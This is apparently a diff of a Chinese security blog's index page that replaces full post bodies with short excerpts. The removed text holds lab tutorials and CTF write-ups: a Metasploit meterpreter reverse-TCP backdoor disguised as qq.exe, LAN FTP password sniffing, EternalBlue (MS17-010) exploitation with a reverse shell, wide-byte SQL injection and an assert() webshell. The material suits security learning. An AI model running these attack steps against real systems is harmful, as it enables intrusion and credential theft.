@@ -5,12 +5,12 @@
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <link rel="dns-prefetch" href="http://yoursite.com">
+  <link rel="dns-prefetch" href="http://mlins.cn">
   <title>Mlins</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="Mlins">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="http://mlins.cn/index.html">
 <meta property="og:site_name" content="Mlins">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mlins">
@@ -171,24 +171,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>kali  x64:192.168.26.136<br>win7  x86: 192.168.26.128</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>先在kali终端输入<font color="red">msfvenom -l</font>，打开payload目录<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/1.png" alt=""></p>
-<p>然后找到<font color="red">payload windows/meterpreter/reverse_tcp</font><br>输入以下命令生成后门qq.exe<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/2.png" alt=""></p>
-<p>然后将生成的qq.exe移到win7中，然后打开msfconsole<br>使用该攻击模块监听<font color="red"> use exploit/multi/handler</font><br>然后设置payload<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/3.png" alt=""></p>
-<p>show options 查看选项<br>设置LHOST为kali地址<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/4.png" alt=""></p>
-<p>然后run开始监听<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/5.png" alt=""></p>
-<p>这时我们打开win7的qq.exe文件<br>就能看到Kali这边获取到一个Session<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/6.png" alt=""></p>
-<p>输入jobs退出，继续输入sessions -l查看session列表<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/7.png" alt=""></p>
-<p>这里有一个session列表，sessionid为1<br>我们输入sessions -i 1,与该session交互<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/8.png" alt=""></p>
-<p>输入getuid查看用户信息<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/9.png" alt=""></p>
-<p>输入systinfo获取系统信息<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/10.png" alt=""></p>
-<p>输入shell即可获取win7的shell<br><img src="/2017/11/22/MSF生成后门拿-windows-shell/11.png" alt=""></p>
-</blockquote>
-
+        <p>msf生成payload拿windows shell<br></p>
+        
+          <a class="article-more-a" href="/2017/11/22/MSF生成后门拿-windows-shell/#more">more >></a>
+        
       
 
       
@@ -250,14 +236,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>首先先打开msf，输入命令<font color="red">use auxiliary/sniffer/psnuffle </font> 进入密码嗅探模块<br>输入<font color="red">show options</font>查看选项<br><img src="/2017/11/22/MSF嗅探FTP密码/1.png" alt=""></p>
-<p>似乎没什么要让我们填的，应该就是嗅探整个局域网里的FTP用户名和密码，那我们直接输入<font color="red">run</font>来运行模块<br><img src="/2017/11/22/MSF嗅探FTP密码/2.png" alt=""></p>
-<p>假设我是局域网里的一位受害者，现在我要远程登陆FTP<br><img src="/2017/11/22/MSF嗅探FTP密码/3.png" alt=""><br><img src="/2017/11/22/MSF嗅探FTP密码/4.png" alt=""></p>
-<p>登陆成功后返回kali，发现kali已经获取了刚刚我输入的用户名和密码<br><img src="/2017/11/22/MSF嗅探FTP密码/5.png" alt=""></p>
-<p>然后你也就能够远程登陆FTP了</p>
-</blockquote>
-
+        <p> msf嗅探ftp用户名和密码<br></p>
+        
+          <a class="article-more-a" href="/2017/11/22/MSF嗅探FTP密码/#more">more >></a>
+        
       
 
       
@@ -319,17 +301,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>这题怎么说呢，非常恶心，虽然flag没出来，但是我觉得差不多了，坐等大神最后的WriteUp,这里我讲下我做题的思路</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>我先把源代码整理好,然后搭建好实验环境，由于代码太多我就不全部展示出来，<br>首先先看入口代码<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/1.png" alt=""><br>这里是判断是否存在$_GET[‘data’]变量，存在则将其反序列化，否则显示源代码，也就是说我们输入的值必须是经过序列化的<br>现在我们来看看CLASS里的结构<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/2.png" alt=""><br>变量$method和$arg是用来传参的，接着我们进入<strong>conn函数<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/3.png" alt=""><br>这个函数主要是用于连接数据库并且创建一个有数据的数据表<br>看完之后，再看看其他自动执行函数<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/4.png" alt="">
-</strong>destruct()函数的主要作用是验证传入的变量$method的值是否为”show”, “login”, “source”,如果为True则将数组$arg的值调用至该函数中<br>__wakeup()函数主要作用为遍历数组$arg的每个值并且进行一次字符转义</p>
-<p>然后我们再分别看show函数、login函数和source函数，最后发现flag在login函数里，则我们将login传入$method的值里，现在我们看login函数的结构<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/5.png" alt=""><br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/6.png" alt="">这里可以看到,$arg数组里传出来的值赋给了$username和$password，然后$username和$password又被字符转义了一遍,也就是说总共被转义了两次，要想拿到flag，用户名就不能是orange,但是字段为admin的也就只有orange用户<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/7.png" alt=""><br>这时我们就需要对这个sql语句进行注入了，我们本地再搭一个环境，方便注入<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/8.png" alt=""><br>主要就是两次字符转义,我们先按照数据库里的数据输入orange,hhh123<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/9.png" alt=""></p>
-<p>查询到两条记录，说明代码还是没写错的,接下来我们尝试加一个单引号<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/10.png" alt="">，因为转义两次，所以多了三个反斜杠，看到反斜杠就想到宽字节注入，输入%df%27<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/11.png" alt="">,因为前面的反斜杠转义了后面的反斜杠，所以我们输入的单引号不会被转义，然后利用#号注释后面的单引号，从而达到闭合，然后我们尝试输入payload使查询字段role的值为admin，然而输入用户名又不能为orange<br><img src="/2017/11/22/CTF练习平台-WEB-代码审计/12.png" alt="">这样我们输入的username就不是orange，但是查询到的字段role的值却是admin，从而得到flag，<br>但实际上不知道哪里出错了，导致flag没出现</p>
-</blockquote>
-
+        <p>这题代码审计怎么说呢，非常恶心，虽然flag没出来，但是我觉得差不多了，坐等大神最后的WriteUp,这里我讲下我做题的思路<br></p>
+        
+          <a class="article-more-a" href="/2017/11/22/CTF练习平台-WEB-代码审计/#more">more >></a>
+        
       
 
       
@@ -391,13 +366,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p><img src="/2017/11/21/CTF练习平台-WEB-过狗一句话/1.png" alt=""><br>整理一下代码<br><img src="/2017/11/21/CTF练习平台-WEB-过狗一句话/2.png" alt=""><br>整理完之后，实际上最后就是<font color="red">assert($_GET[‘s’])</font><br>然而<font color="red">assert()</font>函数和<font color="red">eval()</font>函数是一样的,都是可以执行php代码的</p>
-<p>我们先进入上面给的链接,输入?s=phpinfo()<br><img src="/2017/11/21/CTF练习平台-WEB-过狗一句话/3.png" alt=""><br>发现的确是可以解析php代码的，</p>
-<p>看到服务器的操作系统是linux,接着我们尝试输入<font color="red">system(‘ls’)</font>读取文件目录，但是发现页面是空白的，可能是这种读取方式被限制了吧，于是我们利用PHP自带命令读取当前目录，<font color="red">print_r(glob(‘*‘))</font>，因为glob()函数能够返回指定的文件名和目录，*为通配符，所以自然能返回当前目录<br><img src="/2017/11/21/CTF练习平台-WEB-过狗一句话/4.png" alt=""></p>
-<p>然后我们读取flag.txt文件<br><img src="/2017/11/21/CTF练习平台-WEB-过狗一句话/5.png" alt=""></p>
-</blockquote>
-
+        <p>利用php代码来显示当前目录列表<br></p>
+        
+          <a class="article-more-a" href="/2017/11/21/CTF练习平台-WEB-过狗一句话/#more">more >></a>
+        
       
 
       
@@ -459,16 +431,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<h3 id="先代码审计"><a href="#先代码审计" class="headerlink" title="先代码审计"></a>先代码审计</h3><p><img src="/2017/11/21/CTF练习平台-WEB-字符-正则/1.png" alt=""></p>
-<hr>
-<h4 id="我们将这串正则表达式分为两个部分来分析"><a href="#我们将这串正则表达式分为两个部分来分析" class="headerlink" title="我们将这串正则表达式分为两个部分来分析"></a>我们将这串正则表达式分为两个部分来分析</h4><hr>
-<h5 id="①key-key-4-7-key"><a href="#①key-key-4-7-key" class="headerlink" title="①key.*key.{4,7}key:"></a>①<font color="red">key.*key.{4,7}key:</font></h5><p>第一个key直接照抄下来,后面的.代表任意字符,*代表匹配一次或多次我是觉得能少则少，于是刚才分析下来的字符串可以这么写: <font color="red">keykey</font>后面的.{4,7}代表匹配任意字符4-7次，后面的key:也是照抄下来所以最后第一部分的字符串是:<font color="red">keykeyaaaakey:</font></p>
-<h5 id="②-key-a-z-punct-i"><a href="#②-key-a-z-punct-i" class="headerlink" title="②\/.\/(.*key)[a-z][[:punct:]]/i"></a>②<font color="red">\/.\/(.*key)[a-z][[:punct:]]/i</font></h5><p>这里的\/是代表字符串/的，\符号用于字符转义的，后面的.代表任意字符，上面也说了，所以这里’\/.\/‘我就表示成<font color="red">/s/</font>，’(.*key)’我表示成<font color="red">(key)</font>，’[a-z]’表示小写字母的任意一个,’[[:punct:]]’表示任意的符号，i表示忽略大小写,所以第二部分的表达式我表示成字符串:<font color="red">/s/keyy!</font></p>
-<hr>
-<p>所以整个正则表达式我可以用字符串<font color="red">keykeyaaaakey:/s/keyy!</font>来绕过<br>最终解出flag<br><img src="/2017/11/21/CTF练习平台-WEB-字符-正则/2.png" alt=""></p>
-</blockquote>
-
+        <p>一串正则表达式<br></p>
+        
+          <a class="article-more-a" href="/2017/11/21/CTF练习平台-WEB-字符-正则/#more">more >></a>
+        
       
 
       
@@ -530,26 +496,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>kali:192.168.26.137</p>
-<p>2008 r2 x64:192.168.26.135</p>
-</blockquote>
-<hr>
-<blockquote>
-<h3 id="检测漏洞"><a href="#检测漏洞" class="headerlink" title="检测漏洞"></a>检测漏洞</h3><p>首先先打开msf，输入</p>
-<p><font color="red">use auxiliary/scanner/smb/smb_ms17_010</font><br>来调用辅助模块ms17_010的漏洞扫描模块<br><img src="/2017/11/21/ms17-010漏洞的利用/1.png" alt=""></p>
-<p>然后输入<font color="red">show options</font>来查看该模块选项<br><img src="/2017/11/21/ms17-010漏洞的利用/2.png" alt=""></p>
-<p>这里我们输入<font color="red">set rhosts 192.168.26.135</font>来<br>设置靶机的IP地址<br><img src="/2017/11/21/ms17-010漏洞的利用/3.png" alt=""></p>
-<p>然后输入run来运行该模块<br><img src="/2017/11/21/ms17-010漏洞的利用/4.png" alt=""><br>扫描到该靶机存在此漏洞<br>然后我们就开始利用攻击模块去攻击次漏洞</p>
-</blockquote>
-<hr>
-<blockquote>
-<h3 id="攻击含有此漏洞的靶机"><a href="#攻击含有此漏洞的靶机" class="headerlink" title="攻击含有此漏洞的靶机"></a>攻击含有此漏洞的靶机</h3><p>输入<font color="red">use exploit/windows/smb/ms17_010_eternalblue</font><br>来加载此攻击模块</p>
-<p>输入<font color="red">show options</font>查看选项<br><img src="/2017/11/21/ms17-010漏洞的利用/5.png" alt=""></p>
-<p>然后输入<font color="red">set rhost 192.168.26.135</font>设置靶机的ip<br>接着我们要加载一个payload有效负荷<br>输入<font color="red">set payload windows/x64/shell/reverse_tcp</font>载入payload<br>继续输入<font color="red">show options</font>查看选项<br><img src="/2017/11/21/ms17-010漏洞的利用/6.png" alt=""></p>
-<p>这里我们要加载一个反弹sell的ip地址<br>也就是我们kali的ip地址<br>输入<font color="red">set lhost 192.168.26.137</font><br>然后输入<font color="red">run</font>来开始攻击靶机<br><img src="/2017/11/21/ms17-010漏洞的利用/7.png" alt=""><br>然后就成功的拿到靶机的SHELL</p>
-</blockquote>
-
+        <p>对于msf利用ms17-010漏洞的教程</p>
+        
+          <a class="article-more-a" href="/2017/11/21/ms17-010漏洞的利用/#more">more >></a>
+        
       
 
       
